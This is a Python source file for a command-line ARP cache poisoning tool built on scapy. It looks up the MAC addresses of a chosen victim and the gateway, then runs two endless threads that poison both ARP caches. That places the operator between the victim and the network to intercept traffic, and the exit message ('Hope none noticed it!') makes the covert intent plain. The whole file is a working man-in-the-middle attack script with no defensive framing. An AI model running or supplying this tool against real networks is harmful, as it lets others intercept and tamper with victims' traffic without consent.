import warnings

warnings.filterwarnings("ignore", category=Warning)

import traceback

import scapy.all as scapy
import sys
import argparse
import threading


class Spoofer:
    """Performs ARP Cache Poisoning / Spoofing"""

    def __init__(self, interface=None, gateway_ip=None, victim_ip=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip

        self.gateway_mac = None
        self.victim_mac = None

    def get_mac(self, ip_addr):
        """Finds out the MAC Address of any IP Address on the LAN

        Args:
            ip_addr (str): The IP Address to scan for.

        Returns:
            "string": the MAC address for the provided IP Address
        """
        # create an arp packet, setting ip_addr as destination
        arp_req = scapy.ARP(op=1, pdst=ip_addr)

        # set the destination mac to broadcast
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        # combine both
        arp_req_broadcast = broadcast / arp_req

        # send the packet
        answers = scapy.srp(
            arp_req_broadcast, timeout=10, verbose=False, iface=self.interface
        )[0]

        # get the mac from the answers
        return answers[0][1].hwsrc

    def spoof_victim(self):
        """Spoofs the victim"""
        while True:
            try:
                scapy.arpcachepoison(self.victim_ip, self.gateway_ip, interval=1)

            except Exception as e:
                print("Exception: ", e)
                print(traceback.format_exc())

            # except KeyboardInterrupt:
            #     self.shutdown()

    def spoof_gateway(self):
        """Spoofs the victim"""
        while True:
            try:
                scapy.arpcachepoison(self.gateway_ip, self.victim_ip, interval=0.1)
                # scapy.sendp(
                #     scapy.ARP(
                #         op=2,
                #         pdst=self.gateway_ip,
                #         psrc=self.victim_ip,
                #         hwdst=self.gateway_mac,
                #     ),
                #     iface=self.interface,
                #     verbose=False,
                # )
            except Exception as e:
                print("Exception: ", e)
                print(traceback.format_exc())

            except KeyboardInterrupt:
                self.shutdown()

    def shutdown(self):
        """Exit the program.
        TODO: Graceful exit
        """

        print("[+] Exiting! Hope none noticed it!")
        sys.exit(0)

    def start(self):
        """Starts the Module"""

        try:
            self.victim_mac = self.get_mac(self.victim_ip)
            print("[+] Victim Mac is", self.victim_mac)
        except Exception as e:
            print("[-] Error: Could not find Victim MAC: ", str(e))
            print("[+] Exiting")
            sys.exit(1)

        try:
            self.gateway_mac = self.get_mac(self.gateway_ip)
            print("[+] Gateway Mac is", self.gateway_mac)
        except Exception as e:
            print("[-] Error: Could not find gateway MAC: ", str(e))
            print("[+] Exiting")
            sys.exit(1)

        print("[+] Spamming spoofing packets")

        # Start a process for continuous spoofing
        gateway_spoofing_process = threading.Thread(target=self.spoof_victim)
        gateway_spoofing_process.daemon = True
        gateway_spoofing_process.start()

        # Start a process for continuous spoofing
        victim_spoofing_process = threading.Thread(target=self.spoof_gateway)
        victim_spoofing_process.daemon = True
        victim_spoofing_process.start()

        # Wait for both processes to finish
        gateway_spoofing_process.join()
        victim_spoofing_process.join()

    def __call__(self):
        self.start()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--interface", help="the interface to use", required=True)
    parser.add_argument("-t", "--target", help="the target ip to spoof", required=True)
    parser.add_argument(
        "-g", "--gateway", help="the gateway ip for the network", required=True
    )

    args = parser.parse_args()

    spoofer = Spoofer(
        gateway_ip=args.gateway, victim_ip=args.target, interface=args.interface
    )
    spoofer()
